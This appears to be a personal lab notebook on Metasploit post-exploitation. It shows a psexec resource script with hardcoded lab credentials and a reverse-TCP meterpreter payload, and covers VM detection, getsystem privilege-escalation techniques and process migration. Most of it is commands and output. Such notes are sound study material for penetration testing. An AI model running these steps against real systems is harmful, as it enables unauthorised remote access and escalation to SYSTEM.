## Run this everytime when you go through this section
```python
┌──(root㉿kali)-[/home/hyok]
└─# cat /root/psexec.rc
use exploit/windows/smb/psexec
set RHOST 192.168.216.11
set SMBUSER Administrator
set SMBPASS vagrant
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
┌──(root㉿kali)-[/home/hyok]
└─# msfconsole -q -r /root/psexec.rc
[*] Processing /root/psexec.rc for ERB directives.
resource (/root/psexec.rc)> use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
resource (/root/psexec.rc)> set RHOST 192.168.216.11
RHOST => 192.168.216.11
resource (/root/psexec.rc)> set SMBUSER Administrator
SMBUSER => Administrator
resource (/root/psexec.rc)> set SMBPASS vagrant
SMBPASS => vagrant
resource (/root/psexec.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (/root/psexec.rc)> exploit
[*] Started reverse TCP handler on 192.168.216.9:4444 
[*] 192.168.216.11:445 - Connecting to the server...
[*] 192.168.216.11:445 - Authenticating to 192.168.216.11:445 as user 'Administrator'...
[*] 192.168.216.11:445 - Selecting PowerShell target
[*] 192.168.216.11:445 - Executing the payload...
[+] 192.168.216.11:445 - Service start timed out, OK if running a command or non-service executable...
[*] Exploit completed, but no session was created.
[*] Starting persistent handler(s)...
```

## exploring Post-Exploitation modules
```python
┌──(root㉿kali)-[/home/hyok]
└─# ls /usr/share/metasploit-framework/modules/post
aix  android  apple_ios  bsd  firefox  hardware  linux  multi  networking  osx  solaris  windows
```

- These exploitation modules are categorized by the task performed:
```python
┌──(root㉿kali)-[/home/hyok]
└─# ls /usr/share/metasploit-framework/modules/post/windows
capture  escalate  gather  manage  recon  wlan
```

- Listing all post-exploitation modules by typing `use post/` and then tap `TAB` key two times:
```python
msf6 exploit(windows/smb/psexec) > use post/
Display all 409 possibilities? (y or n)
use post/aix/hashdump                                           use post/windows/gather/credentials/enum_cred_store
use post/android/capture/screen                                 use post/windows/gather/credentials/enum_laps
```

## Checking that the target is running inside a Virtual Environment
- For this purpose, we use Windows Gather Virtual Environment Detection post-exploitation gather module.
```python
meterpreter > background
[*] Backgrounding session 1...
[*] Starting persistent handler(s)...
msf6 exploit(windows/smb/psexec) > use post/windows/gather/checkvm
msf6 post(windows/gather/checkvm) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/checkvm) > run

[*] Checking if the target is a Virtual Machine ...
[+] This is a VirtualBox Virtual Machine
[*] Post module execution completed
```

## Escalating our privilege using Meterpreter:
## Pre-requisite - [[named pipe]]
```python
meterpreter > getsystem -h
Usage: getsystem [options]

Attempt to elevate your privilege to that of local system.

OPTIONS:

    -h   Help Banner.
    -t   The technique to use. (Default to '0').
		0 : All techniques available
		1 : Named Pipe Impersonation (In Memory/Admin)
		2 : Named Pipe Impersonation (Dropper/Admin)
		3 : Token Duplication (In Memory/Admin)
		4 : Named Pipe Impersonation (RPCSS variant)
		5 : Named Pipe Impersonation (PrintSpooler variant)
		6 : Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
```

`Named Pipe` : A type of interprocess communication mechanism in Windows that enables processes to communicate with each othr over a network.
`Impersonation` : The ability of a thread in Windows to temporarily adopt the security context of another user or process, including their permissions and access rights.

`1` : Uses named pipe impersonation in memory to gain administrator access.
`In Memory` : Refers to a technique used to escalate privileges in which the malicious code is injected into the memory of a target process, rather than being written to disk.

`2` : Uses named pipe impersonation with a dropper to gain administrator access.
`Dropper` : A type of malware that drops or installs additional malware on an infected system.

`3` : Duplicates a token in memory to gain administrator access.
`Token Dupclication` : A technique used to gain administrative privileges by duplicating the [[access token]] of a process with higher privileges.

`4` : Uses a variant of named pipe impersonation for Remote Procedure Call(RPC) named pipes to gain administrator access.
`RPC(Remote Procedure Call)` : A protocol used to enable communication between processes on different systems.

`5` : Uses a variant of named pipe impersonation for Print Spooler named pipes to gain administrator access.
`Print Spooler` : A Windows service that manages print jobs and print queues.

`6` : Uses a variant of named pipe impersonation for Encrypting File System Remote Procedure Call(EFSRPC) named pipes to gain administrator access. This is also known as EfsPotato.
`EFS(Encrypting File System)` : A Windows feature that provides file-level encryption.
`EfsPotato` : A privilege escalation technique that exploits a vulnerability in the Encrypting File System Remote Procedure Call(EFSRPC) service to gain administrative access.

```python
meterpreter > getuid 
Server username: IE11WIN7\IEUser 
meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). 
meterpreter >
```

## migrating from one process to another process
- This command is used to migrate from one process context to another, which can be helpful in situations where the current process which we have broken into might crash.
- For example, if we use a browser exploit to penetrate the system, the browser may hang after exploitation, and the user may close it. So, migrating to a stable system process can help us perform our penetration testing smoothly.
```python
meterpreter > migrate 1876
[*] Migrating from 4160 to 1876...
[*] Migration completed successfully.
meterpreter > migrate -N cmd.exe
[*] Migrating from 712 to 1412...
[*] Migration completed successfully.
```
